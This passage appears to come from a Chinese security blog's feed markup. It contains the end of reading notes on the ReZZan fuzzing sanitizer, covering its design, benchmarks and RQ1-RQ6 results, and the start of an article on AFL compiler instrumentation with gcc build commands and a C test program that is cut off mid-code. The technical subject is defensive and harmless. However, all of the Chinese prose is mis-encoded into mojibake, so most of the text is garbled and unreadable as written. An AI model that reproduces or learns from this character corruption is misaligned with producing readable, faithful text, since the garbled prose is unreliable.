æ³•è¢«åŸºæœ¬çš„RETæ£€æµ‹åˆ°ï¼Œä¸ºäº†æ£€æµ‹åˆ°è¿™ç§æº¢å‡ºï¼Œæˆ‘ä»¬å¯¹å†…å­˜è®¿é—®è¿›è¡Œæ’æ¡©ä»¥å®æ–½ä¸€ä¸ªé¢å¤–çš„è¾¹ç•Œæ£€æµ‹ï¼š</p><ol><li><p>æ£€æŸ¥å†…å­˜ä¸­å½“å‰wordçš„ä¸‹ä¸€ä¸ªword[8å­—èŠ‚]</p></li><li><p>å¦‚æœä¸‹ä¸€ä¸ªwordä¸æ˜¯ä¸€ä¸ªtoken(i.e.éšæœºæ¯”ç‰¹ä¸NONCEä¸ç›¸åŒ)ï¼Œé‚£ä¹ˆå†…å­˜è®¿é—®æ˜¯å…è®¸çš„</p></li><li><p>å¦åˆ™ï¼Œæ£€ç´¢è¾¹ç•Œå­—æ®µå¹¶å°†å…¶ä½™å†…å­˜è®¿é—®èŒƒå›´ $lbâ€¦ub$ è¿›è¡Œæ¯”è¾ƒï¼Œå½“ä¸‹é¢æ¡ä»¶ä¸æˆç«‹æ—¶ï¼Œå³å‘ç”Ÿäº†è¶Šç•Œæ“ä½œï¼š</p><p><img src="/2023/01/10/ReZZan/6.png"></p></li></ol><p>ç”±äºæ£€æŸ¥çš„æ˜¯ä¸‹ä¸€ä¸ªwordï¼Œå› æ­¤åŸºæœ¬ä¸Šç»•è¿‡äº†å¡«å……ç©ºé—´ä¸è¶³çš„é—®é¢˜ï¼Œåœ¨å›¾3çš„ç¤ºä¾‹ä¸­ï¼Œä»»ä½•ä¸å¡«å……é‡å çš„å†…å­˜è®¿é—®éƒ½ä¸ä¼šæ»¡è¶³ï¼Œå› æ­¤å¯ä»¥æ£€æµ‹åˆ°æº¢å‡º</p><hr><p><strong>æ’æ¡©æ¨¡å¼ï¼š</strong></p><p><img src="/2023/01/10/ReZZan/3.png"></p><ul><li>å›¾2çš„ç¬¬9-13è¡Œä¸ºè¾¹ç•Œæ£€æŸ¥çš„æ’æ¡©ï¼Œè¿™é‡Œå‡è®¾è¯¥å†…å­˜è®¿é—®å·²ç»é€šè¿‡RETæ£€æŸ¥ï¼Œä¿è¯äº†ubä¸åŒ…å«token</li></ul><blockquote><p>ä¸‹ä¸€ä¸ªwordå¯èƒ½ä½äºä¸åŒçš„é¡µé¢ï¼Œå› æ­¤å¯èƒ½æ— æ³•è®¿é—®ã€‚è¿™å¯ä»¥é€šè¿‡ç¦ç”¨å¯¹é¡µè¾¹ç•Œçš„ç²¾ç¡®æ£€æŸ¥æ¥è¿›è¡Œå¤„ç†ï¼Œéšä¹‹å¸¦æ¥çš„å°±æ˜¯ç²¾ç¡®åº¦çš„é™ä½ï¼›æˆ–è€…æ‰€æœ‰æ˜ å°„éƒ½å¯ä»¥é€šè¿‡ä¸€ä¸ªNONCE-åˆå§‹åŒ–é¡µè¿›è¡Œæ‰©å±•ï¼Œå¯ä»¥é€šè¿‡ä½¿ç”¨ä¿¡å·å¤„ç†å™¨æ¥æ£€æµ‹è¾¹ç•Œæ£€æŸ¥å¼•èµ·çš„æ•…éšœï¼Œç„¶åâ€œæŒ‰éœ€â€æ‰©å±•ç›¸åº”çš„æ˜ å°„æ¥å®ç°</p></blockquote><h2 id="5-å®éªŒè®¾ç½®"><a href="#5-å®éªŒè®¾ç½®" class="headerlink" title="5. å®éªŒè®¾ç½®"></a>5. å®éªŒè®¾ç½®</h2><ul><li><p>x86_64ä¸Šå®ç°äº†REt+fuZZing+sANitzerï¼ˆReZZanï¼‰ï¼š</p><ul><li>ReZZanï¼šç»†ç²’åº¦å†…å­˜é”™è¯¯æ£€æµ‹ï¼ŒåŒ…æ‹¬RETï¼ˆç¬¬ä¸‰èŠ‚ï¼‰å’Œå­—èŠ‚å‡†ç¡®çš„è¾¹ç•Œæ£€æµ‹ï¼ˆç¬¬å››èŠ‚ï¼‰</li><li>ReZZan<sub>lite</sub>ï¼šå‡å¼±ç²’åº¦çš„å†…å­˜é”™è¯¯æ£€æµ‹ï¼Œä»…åŒ…æ‹¬RETã€‚æ­¤ç‰ˆæœ¬é€Ÿåº¦æ›´å¿«ï¼Œä½†æ— æ³•æ£€æµ‹åˆ°å¯¹è±¡å¡«å……ä¸­çš„æŸäº›æº¢å‡º</li></ul></li><li><p>ReZZançš„å®ç°åŒ…æ‹¬ä¸¤ä¸ªéƒ¨åˆ†ï¼š</p><ul><li>LLVM Passï¼š<ul><li>è½¬æ¢æ‰€æœ‰å†…å­˜æ“ä½œï¼ˆe.g. <code>load/store</code>ï¼‰ä»¥æ’å…¥RETå’Œè¾¹ç•Œæ£€æŸ¥æ’æ¡©ã€‚å¯¹äºReZZan<sub>lite</sub>æ¥è¯´ï¼Œè¾¹ç•Œæ£€æŸ¥å°†è¢«å¿½ç•¥</li><li>å°†æ‰€æœ‰æ ˆåˆ†é…æ“ä½œï¼ˆe.g. <code>alloca</code>ï¼‰å’Œå…¨å±€å˜é‡è½¬æ¢ä¸ºä½¿ç”¨redzoneä¿æŠ¤çš„æ–°ç‰ˆæœ¬</li></ul></li><li>è¿è¡Œæ—¶åº“ï¼š<ul><li>å®ç°äº†æ›¿æ¢å †åˆ†é…å‡½æ•°ï¼ˆä¾‹å¦‚<code>malloc</code>ã€<code>free</code>ç­‰ï¼‰ï¼Œæ›¿æ¢çš„å‡½æ•°å¯ä»¥æ’å…¥redzoneä»¥åŠpoisoné‡Šæ”¾çš„å†…å­˜</li></ul></li></ul></li></ul><hr><h3 id="ç ”ç©¶é—®é¢˜"><a href="#ç ”ç©¶é—®é¢˜" class="headerlink" title="ç ”ç©¶é—®é¢˜"></a>ç ”ç©¶é—®é¢˜</h3><ul><li><p>ä¸»è¦å‡è¯´ï¼šåŸºäºRETçš„æ¶ˆæ¯’å‰‚è®¾è®¡å¯ä»¥</p><ol><li>åœ¨æ¨¡ç³Šæµ‹è¯•ç¯å¢ƒä¸‹è¡¨ç°å‡ºè¾ƒä½çš„æ€§èƒ½å¼€é”€</li><li>å®ç°ä¸æ›´ä¼ ç»Ÿçš„Sanitizerè®¾è®¡ï¼ˆå¦‚ASANï¼‰ç±»ä¼¼çš„å†…å­˜é”™è¯¯æ£€æµ‹èƒ½åŠ›</li></ol></li><li><p>å…­ä¸ªç ”ç©¶é—®é¢˜ï¼š</p></li></ul><table><thead><tr><th>åºå·</th><th>æè¿°</th></tr></thead><tbody><tr><td>RQ1 - æ£€æµ‹èƒ½åŠ›</td><td>ReZZanæ˜¯å¦æ£€æµ‹åˆ°ä¸ASanç›¸åŒç±»å‹çš„å†…å­˜é”™è¯¯ï¼Ÿ</td></tr><tr><td>RQ2 - æ‰§è¡Œé€Ÿåº¦</td><td>åœ¨æ¨¡ç³Šæµ‹è¯•ç¯å¢ƒä¸‹ï¼ŒReZZanæ¯”ASanå¿«å¤šå°‘ï¼Ÿ</td></tr><tr><td>RQ3 - åˆ†æ”¯è¦†ç›–</td><td>ReZZançš„åˆ†æ”¯è¦†ç›–èŒƒå›´ä¸ASanç›¸æ¯”å¦‚ä½•ï¼Ÿ</td></tr><tr><td>RQ4 - æ¼æ´å‘ç°æœ‰æ•ˆæ€§</td><td>ä¸ASanç›¸æ¯”ï¼ŒReZZanå¯ä»¥æ›´å¿«åœ°æš´éœ²bugå—ï¼Ÿ</td></tr><tr><td>RQ5 - çµæ´»æ€§</td><td>ReZZanå¯ä»¥ç”¨æ¥æ¨¡ç³Šå¤§å‹ç¨‹åºå—ï¼ŸReZZanä¸å…¶ä»–æ¨¡ç³Šå™¨å…¼å®¹å—ï¼Ÿ</td></tr><tr><td>RQ6 - è¯¯æŠ¥</td><td>ReZZanåœ¨å®é™…æ‰§è¡Œç¯å¢ƒä¸­çš„é”™è¯¯æ£€æµ‹ç‡æ˜¯å¤šå°‘ï¼Ÿ</td></tr></tbody></table><h3 id="åŸºç¡€è®¾æ–½"><a href="#åŸºç¡€è®¾æ–½" class="headerlink" title="åŸºç¡€è®¾æ–½"></a>åŸºç¡€è®¾æ–½</h3><p><strong>å®éªŒç¯å¢ƒï¼š</strong></p><ul><li>Intel Xeon CPU E5-2660v3ï¼š28ä¸ªç‰©ç†å†…æ ¸ã€56ä¸ªé€»è¾‘å†…æ ¸ï¼Œ2.4GHz</li><li>64GB RAM</li><li>Ubuntu 16.04ï¼ˆ64ä½ï¼‰LTSï¼ˆæœ€å¤§åˆ©ç”¨ç‡ä¸º26ä¸ªå†…æ ¸ï¼‰</li></ul><hr><p><strong>åŸºçº¿ï¼š</strong></p><ul><li>ASanï¼ˆLLVM-12ï¼‰ã€FuZZanï¼ˆå…·æœ‰åŠ¨æ€å…ƒæ•°æ®ç»“æ„åˆ‡æ¢æ¨¡å¼ï¼‰</li><li>ASanå’ŒFuZZanéƒ½ï¼š<ol><li>ä»åœ¨ç»´æŠ¤</li><li>æ”¯æŒx86_64</li><li>å¯ä»¥ä¸ç°æœ‰çš„æ¨¡ç³Šå™¨é›†æˆ</li></ol></li></ul><hr><p><strong>æ¨¡ç³Šæµ‹è¯•å¼•æ“</strong>ï¼š</p><ul><li>AFLï¼ˆv2.57bï¼‰<ul><li>æ˜¯å¤§å¤šæ•°ç°ä»£æ¨¡ç³Šå™¨çš„åŸºç¡€</li><li>è¯„ä¼°æ‰€ä½¿ç”¨çš„æ‰€æœ‰sanitizeréƒ½æ”¯æŒ</li></ul></li></ul><hr><p><strong>åŸºå‡†å¥—ä»¶</strong>ï¼š</p><ul><li>RQ1ï¼šJulietåŸºå‡†å¥—ä»¶</li><li>RQ2/RQ3ï¼šcxxfiltã€nmã€objdumpã€sizeï¼ˆå‡æ¥è‡ªbinutils-2.31ï¼‰ã€fileï¼ˆæ¥è‡ªcoreutilsç‰ˆæœ¬5.35ï¼‰ã€jerryscriptï¼ˆç‰ˆæœ¬2.4.0ï¼‰ã€mupdfï¼ˆç‰ˆæœ¬1.19.0ï¼‰ã€ï¼Œlibpngï¼ˆç‰ˆæœ¬1.6.38ï¼‰ã€opensslï¼ˆç‰ˆæœ¬1.0.1fï¼‰ã€sqlite3ï¼ˆç‰ˆæœ¬3.36.0ï¼‰å’Œtcpdumpï¼ˆç‰ˆæœ¬4.10.0ï¼‰</li><li>RQ4ï¼šè°·æ­Œçš„fuzzer-test-suite2</li></ul><p>é€‰æ‹©ç›¸åŒçš„åˆå§‹ç§å­è¯­æ–™åº“ï¼Œå¦‚æœæ²¡æœ‰æä¾›è¾“å…¥åˆ™ä½¿ç”¨ç©ºæ–‡ä»¶</p><hr><p><strong>å®éªŒè®¾ç½®ï¼š</strong></p><ul><li>æ¯ä¸ªå®éªŒè¿›è¡Œ24å°æ—¶ï¼Œé‡å¤20æ¬¡</li></ul><h2 id="6-è¯„ä¼°ç»“æœ"><a href="#6-è¯„ä¼°ç»“æœ" class="headerlink" title="6. è¯„ä¼°ç»“æœ"></a>6. è¯„ä¼°ç»“æœ</h2><h3 id="RQ-one-æ£€æµ‹èƒ½åŠ›"><a href="#RQ-one-æ£€æµ‹èƒ½åŠ›" class="headerlink" title="RQ:one: æ£€æµ‹èƒ½åŠ›"></a>RQ<span class="github-emoji"><span>1âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> æ£€æµ‹èƒ½åŠ›</h3><p><img src="/2023/01/10/ReZZan/7.png"></p><ul><li>ReZZanå’ŒReZZan<sub>lite</sub>å¯¹äºunderflow detectionçš„æ£€æµ‹æ€§èƒ½ç•¥ä½äºASanï¼Œè¿™æ˜¯å› ä¸ºASané»˜è®¤ä¸ºå †æ ˆå¯¹è±¡ä½¿ç”¨double-wideï¼ˆ32å­—èŠ‚ï¼‰çº¢åŒºã€‚å½“ReZZané…ç½®ç±»ä¼¼æ—¶ï¼Œä¹Ÿèƒ½100%æ£€æµ‹ä¸‹æº¢é”™è¯¯</li></ul><p><img src="/2023/01/10/ReZZan/8.png"></p><blockquote><p>å¯¹äºJulietæµ‹è¯•å¥—ä»¶ä¸­çš„å†…å­˜é”™è¯¯é”™è¯¯ï¼ˆCWE 121ã€122ã€124ã€126ã€127ã€416ï¼‰ï¼ŒReZZanå’ŒReZZan<sub>lite</sub>åˆ†åˆ«é€šè¿‡99.04%å’Œ87.89%çš„åæµ‹è¯•ç”¨ä¾‹</p></blockquote><h3 id="RQ-two-æ‰§è¡Œé€Ÿåº¦"><a href="#RQ-two-æ‰§è¡Œé€Ÿåº¦" class="headerlink" title="RQ:two: æ‰§è¡Œé€Ÿåº¦"></a>RQ<span class="github-emoji"><span>2âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> æ‰§è¡Œé€Ÿåº¦</h3><p><img src="/2023/01/10/ReZZan/9.png"></p><p><img src="/2023/01/10/ReZZan/10.png"></p><ul><li>é¡µé”™è¯¯</li></ul><p><img src="/2023/01/10/ReZZan/11.png"></p><blockquote><p>å½“ä¸æ¨¡ç³Šæµ‹è¯•ç›¸ç»“åˆæ—¶ï¼ŒReZZanï¼ˆ1.27Ã—ï¼‰å’ŒReZZan<sub>lite</sub>ï¼ˆ1.14Ã—ï¼‰çš„å¼€é”€ä½äºä¼ ç»Ÿçš„Sanitizer ASanï¼ˆ2.36Ã—ï¼‰å’ŒFuZZanï¼ˆ2.00Ã—ï¼‰ã€‚ReZZanå’ŒReZZan<sub>lite</sub>çš„æ€§èƒ½ä¸æ²¡æœ‰ä»»ä½•å†…å­˜é”™è¯¯sanitizationçš„æ¨¡ç³Šæµ‹è¯•ç›¸å½“ï¼Œé¡µé¢é”™è¯¯çš„æ•°é‡ä¹Ÿæ˜¯å¦‚æ­¤.</p></blockquote><h3 id="RQ-three-åˆ†æ”¯è¦†ç›–"><a href="#RQ-three-åˆ†æ”¯è¦†ç›–" class="headerlink" title="RQ:three: åˆ†æ”¯è¦†ç›–"></a>RQ<span class="github-emoji"><span>3âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0033-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> åˆ†æ”¯è¦†ç›–</h3><p><img src="/2023/01/10/ReZZan/12.png"></p><blockquote><p>å¹³å‡è€Œè¨€ï¼ŒReZZanå’ŒReZZan<sub>lite</sub>å®ç°äº†ä¸Nativeç±»ä¼¼çš„åˆ†æ”¯è¦†ç›–ã€‚ReZZançš„æ¨¡ç³ŠåŒ–æ´»åŠ¨åœ¨24å°æ—¶å†…æ¢ç´¢äº†æ¯”ASanå¤š5.54%çš„ä»£ç åˆ†æ”¯ã€‚</p></blockquote><h3 id="RQ-four-æ¼æ´å¯»æ‰¾æœ‰æ•ˆæ€§"><a href="#RQ-four-æ¼æ´å¯»æ‰¾æœ‰æ•ˆæ€§" class="headerlink" title="RQ:four: æ¼æ´å¯»æ‰¾æœ‰æ•ˆæ€§"></a>RQ<span class="github-emoji"><span>4âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0034-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> æ¼æ´å¯»æ‰¾æœ‰æ•ˆæ€§</h3><p><img src="/2023/01/10/ReZZan/13.png"></p><blockquote><p>ReZZanæ¯”ASanå¿«3.68å€ã€‚åœ¨å®è·µä¸­ï¼ŒReZZanè¿˜å¯ä»¥æ£€æµ‹åˆ°æ¯”ReZZan<sub>lite</sub>æ›´å¤šçš„é”™è¯¯ã€‚</p></blockquote><h3 id="RQ-five-çµæ´»æ€§"><a href="#RQ-five-çµæ´»æ€§" class="headerlink" title="RQ:five: çµæ´»æ€§"></a>RQ<span class="github-emoji"><span>5âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0035-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> çµæ´»æ€§</h3><ul><li><p><strong>æ¨¡ç³Šå™¨çš„æ”¯æŒï¼š</strong></p><ul><li>ä¸AFL++é›†æˆï¼š</li></ul><p><img src="/2023/01/10/ReZZan/14.png"></p></li><li><p><strong>æŒä¹…æ¨¡å¼æ¨¡ç³Šæµ‹è¯•ï¼š</strong></p><ul><li>FuzzBenchæä¾›çš„harnessä½œä¸ºæµ‹è¯•å¯¹è±¡</li><li>ReZZanå’ŒReZZan<sub>lite</sub>çš„æ€§èƒ½ç•¥æœ‰ä¸‹é™</li><li>ç»“æœè¡¨æ˜ï¼š1. ReZZanå¯ä»¥åº”ç”¨äºforkæ¨¡å¼å’ŒæŒä¹…æ¨¡å¼ï¼›2. ReZZenåœ¨è¾ƒé•¿è¿è¡Œæ—¶é—´å†…çš„å…¶æ€§èƒ½æœ€ç»ˆå°†æ¥è¿‘ASan</li></ul></li><li><p><strong>å¯æ‰©å±•æ€§ï¼š</strong></p><p><img src="/2023/01/10/ReZZan/15.png"></p><ul><li><p>è€ƒè™‘åˆ°Firefoxçš„è§„æ¨¡ï¼Œä¸å…¶ä»–åŸºå‡†ç›¸æ¯”ï¼Œæ€»ä½“æ¨¡ç³Šååé‡è¦æ…¢å¾—å¤šã€‚å°½ç®¡å¦‚æ­¤ï¼ŒReZZanå’ŒReZZan<sub>lite</sub>ä»ä»¥112.60%å’Œ114.86%çš„æ”¹å–„ç‡ä¼˜äºASan</p></li><li><p>è¯æ˜ReZZanæ˜¯å¯æ‰©å±•çš„</p></li></ul></li></ul><h3 id="RQ-six-è¯¯æŠ¥"><a href="#RQ-six-è¯¯æŠ¥" class="headerlink" title="RQ:six: è¯¯æŠ¥"></a>RQ<span class="github-emoji"><span>6âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0036-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> è¯¯æŠ¥</h3><ul><li>ReZZanè®¾è®¡å…è®¸å°‘é‡è¯¯æŠ¥</li><li>å®éªŒåŒ…æ‹¬è¶…è¿‡19200å°æ—¶ï¼ˆâ‰ˆ2.2å¹´ï¼‰CPUæ—¶é—´ï¼Œåœ¨æ­¤æœŸé—´æ²¡æœ‰è§‚å¯Ÿåˆ°è¯¯æŠ¥</li><li>é¢„æœŸæ˜¯æ•°åå¹´çš„CPUæ—¶é—´æ‰å¯èƒ½è§‚å¯Ÿåˆ°ç¬¬ä¸€æ¬¡è¯¯æŠ¥</li></ul><h2 id="æˆ‘çš„çœ‹æ³•"><a href="#æˆ‘çš„çœ‹æ³•" class="headerlink" title="æˆ‘çš„çœ‹æ³•"></a>æˆ‘çš„çœ‹æ³•</h2><p><span class="github-emoji"><span>â­</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> äº®ç‚¹ï¼š</p><ul><li>è®ºæ–‡åˆ†æäº†ç°æœ‰Sanitizerä¸åŸºäºforkæ¨¡å¼çš„æ¨¡ç³Šå™¨ç»“åˆæ—¶å¯¹æ¨¡ç³Šæµ‹è¯•æ€§èƒ½çš„å½±å“ï¼Œä¸»è¦ä½“ç°åœ¨ï¼š1. COWæœºåˆ¶å¯¼è‡´é¢‘ç¹çš„é¡µé”™è¯¯ï¼›2.disjoint metadataï¼Œå› æ­¤ä¸fork()å…¼å®¹æ€§ä¸å¥½</li><li>è®ºæ–‡æå‡ºäº†åŸºäºRETå’Œæ”¹è¿›çš„ç»†ç²’åº¦è¾¹ç•Œæ£€æµ‹çš„Sanitizerâ€”â€”ReZZanï¼Œå¹¶é€šè¿‡è¯¦ç»†çš„å®éªŒè®ºè¯ReZZançš„æ€§èƒ½</li><li>å®éªŒéƒ¨åˆ†å¾ˆè¯¦ç»†</li><li>é¡¹ç›®å¼€æºï¼š<a href="https://github.com/bajinsheng/ReZZan">https://github.com/bajinsheng/ReZZan</a></li></ul><p>ä¸è¶³ï¼š</p><ul><li>ä»…æ”¯æŒllvm-12ï¼Œè€Œä¸”wrapperçš„ä¸€äº›ç»†èŠ‚å¤„ç†ä¸æ˜¯å¾ˆå¥½</li><li><strong>ç›®æµ‹</strong>åº”è¯¥ä¸ä¼šæœ‰ASané‚£ä¹ˆè¯¦ç»†çš„é”™è¯¯æŠ¥å‘Šï¼Œä¹Ÿå°±æ˜¯è¯´ReZZanä»…ä¼šå¼‚å¸¸ç»“æŸç¨‹åºï¼Œè¿˜éœ€è¦ä½¿ç”¨ASanæŸ¥çœ‹å…·ä½“æ˜¯ä½•ç§æ¼æ´ç±»å‹ï¼ˆå¾…éªŒè¯ï¼‰</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>è®ºæ–‡é˜…è¯»</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ·±å…¥æµ…å‡ºAFLæ’æ¡©</title>
    <link href="/2022/12/27/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%89%96%E6%9E%90AFL%E6%8F%92%E6%A1%A9/"/>
    <url>/2022/12/27/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%89%96%E6%9E%90AFL%E6%8F%92%E6%A1%A9/</url>
    
    <content type="html"><![CDATA[<h1 id="AFLæ’æ¡©å‰–æ"><a href="#AFLæ’æ¡©å‰–æ" class="headerlink" title="AFLæ’æ¡©å‰–æ"></a>AFLæ’æ¡©å‰–æ</h1><h2 id="I-å‰ç½®çŸ¥è¯†"><a href="#I-å‰ç½®çŸ¥è¯†" class="headerlink" title="I. å‰ç½®çŸ¥è¯†"></a>I. å‰ç½®çŸ¥è¯†</h2><ul><li>ç¼–è¯‘å™¨äº§ç”Ÿå¯æ‰§è¡Œæ–‡ä»¶çš„æµç¨‹å¦‚ä¸‹å›¾1ã€2æ‰€ç¤ºï¼ˆä»¥gccç¼–è¯‘å™¨ä¸ºä¾‹ï¼ŒclangåŒç†ï¼‰ï¼š</li></ul><p><img src="/2022/12/27/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%89%96%E6%9E%90AFL%E6%8F%92%E6%A1%A9/1.png"></p><center>å›¾1 gccç¼–è¯‘å™¨å·¥ä½œæµç¨‹ï¼ˆé¡¶å±‚æ¶æ„ï¼‰</center><p><img src="/2022/12/27/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%89%96%E6%9E%90AFL%E6%8F%92%E6%A1%A9/2.png"></p><center>å›¾2 clangç¼–è¯‘å™¨å·¥ä½œæµç¨‹ï¼ˆé¡¶å±‚æ¶æ„ï¼‰</center><ul><li>ä¸»æµçš„ç¼–è¯‘å™¨ã€å›¾1ä¸­ç¬¬äºŒä¸ªé˜¶æ®µã€‘åŒ…æ‹¬ä¸‰ä¸ªç»„ä»¶ï¼š<strong>å‰ç«¯</strong>ã€<strong>ä¸­é—´ç«¯</strong>å’Œ<strong>åç«¯</strong> [1]<ul><li>å‰ç«¯ï¼šè¯»å–æºæ–‡ä»¶å¹¶å¯¹å…¶è¿›è¡Œåˆ†æï¼Œé€šå¸¸æ˜¯å°†æºç è½¬åŒ–ä¸ºæ ‡å‡†æŠ½è±¡è¯­æ³•æ ‘ï¼ˆASTï¼‰</li><li>ä¸­é—´ç«¯ï¼šè¿›è¡Œæºç ä¼˜åŒ–ï¼Œé€šå¸¸æ˜¯ä½¿ç”¨ç”Ÿæˆçš„æŸç§ä¸­é—´è¡¨ç¤ºã€GCCä¸­æ˜¯GIMPLE/RTLï¼›Clangä¸­æ˜¯IRã€‘ï¼Œå¹¶æ ¹æ®è¯¥ä¸­é—´è¡¨ç¤ºè¿›è¡Œä¼˜åŒ–</li><li>åç«¯ï¼šä½¿ç”¨ä¼˜åŒ–åçš„ä¸­é—´è¡¨ç¤ºæ¥ç”Ÿæˆå¯¹åº”ç›®æ ‡æ¶æ„çš„æ±‡ç¼–ä»£ç </li></ul></li></ul><h3 id="1-GCC"><a href="#1-GCC" class="headerlink" title="1. GCC"></a>1. GCC</h3><ul><li>GCC 4.1æ¶æ„å›¾ï¼š</li></ul><p><img src="/2022/12/27/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%89%96%E6%9E%90AFL%E6%8F%92%E6%A1%A9/4.png"></p><center>å›¾3 GCC 4.1æ¶æ„å›¾</center><h4 id="å››ä¸ªé˜¶æ®µ"><a href="#å››ä¸ªé˜¶æ®µ" class="headerlink" title="å››ä¸ªé˜¶æ®µ"></a>å››ä¸ªé˜¶æ®µ</h4><p><img src="/2022/12/27/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%89%96%E6%9E%90AFL%E6%8F%92%E6%A1%A9/5.png"></p><center>å›¾4 ç¼–è¯‘å™¨åœ¨ç¼–è¯‘é“¾æ¥æ—¶çš„å…·ä½“æµç¨‹[8]</center><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ gcc -E afl_inst_test.c <span class="hljs-comment"># é¢„å¤„ç†</span><br>$ gcc -S afl_inst_test.c <span class="hljs-comment"># ç¼–è¯‘</span><br>$ gcc -c afl_inst_test.c <span class="hljs-comment"># æ±‡ç¼– =&gt; ç›®æ ‡æ–‡ä»¶ or as afl_inst_test.s -o afl_inst_test.o</span><br>$ ld -plugin /usr/lib/gcc/x86_64-linux-gnu/7/liblto_plugin.so -plugin-opt=/usr/lib/gcc/x86_64-linux-gnu/7/lto-wrapper -plugin-opt=-fresolution=/tmp/cclTw8TB.res -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_s -plugin-opt=-pass-through=-lc -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_s --build-id --eh-frame-hdr -m elf_x86_64 --hash-style=gnu --as-needed -dynamic-linker /lib64/ld-linux-x86-64.so.2 -pie -z now -z relro /usr/lib/gcc/x86_64-linux-gnu/7/../../../x86_64-linux-gnu/Scrt1.o /usr/lib/gcc/x86_64-linux-gnu/7/../../../x86_64-linux-gnu/crti.o /usr/lib/gcc/x86_64-linux-gnu/7/crtbeginS.o -L/usr/lib/gcc/x86_64-linux-gnu/7 -L/usr/lib/gcc/x86_64-linux-gnu/7/../../../x86_64-linux-gnu -L/usr/lib/gcc/x86_64-linux-gnu/7/../../../../lib -L/lib/x86_64-linux-gnu -L/lib/../lib -L/usr/lib/x86_64-linux-gnu -L/usr/lib/../lib -L/usr/lib/gcc/x86_64-linux-gnu/7/../../.. ./afl_inst_test.o -lgcc --push-state --as-needed -lgcc_s --pop-state -lc -lgcc --push-state --as-needed -lgcc_s --pop-state /usr/lib/gcc/x86_64-linux-gnu/7/crtendS.o /usr/lib/gcc/x86_64-linux-gnu/7/../../../x86_64-linux-gnu/crtn.o -o afl_inst_test <span class="hljs-comment"># é“¾æ¥ï¼[10]</span><br>$ afl_inst_test<br>This is a <span class="hljs-built_in">test</span>!<br>Please give me an input number:-1<br>-1 is a negative number~<br></code></pre></td></tr></tbody></table></figure><h4 id="å‰ç«¯åˆ†æ"><a href="#å‰ç«¯åˆ†æ" class="headerlink" title="å‰ç«¯åˆ†æ"></a>å‰ç«¯åˆ†æ</h4><ul><li><p>å¯¹æºä»£ç è¿›è¡Œ<strong>é¢„å¤„ç†</strong>ã€<strong>è¯­æ³•åˆ†æ</strong>ã€<strong>è¯­ä¹‰åˆ†æ</strong>ï¼ŒåŒæ—¶ä¼šç”ŸæˆæŠ½è±¡è¯­æ³•æ ‘<strong>AST</strong></p></li><li><p>parse the source code  <span class="github-emoji"><span>â¡</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/27a1.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>  å³å°†æºä»£ç è½¬åŒ–ä¸ºæœ‰æ„ä¹‰çš„æ•°æ®ï¼ˆæœ‰æ„ä¹‰æ˜¯é’ˆå¯¹æœºå™¨æ¥è¯´çš„ï¼‰ï¼Œè¡¨ç¤ºæˆ‘ä»¬å¯è¯»çš„æºä»£ç ç©¶ç«Ÿæƒ³è¦è¡¨è¾¾å•¥</p></li></ul><hr><p><span class="github-emoji"><span>ğŸ¤”</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f914.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <strong>GCCæœ¬èº«æ— æ³•è¾“å‡ºç”Ÿæˆçš„AST [2]ï¼Œè¿™é‡Œæˆ‘ä»¬å±•ç¤ºGCCç¼–è¯‘è¿‡ç¨‹ä¸­ç”Ÿæˆçš„CFG [3]</strong> ï¼š</p><ol start="0"><li>æºä»£ç ï¼š</li></ol><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// afl_inst_test.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fun</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span>{<br><span class="hljs-keyword">if</span>(a &gt; <span 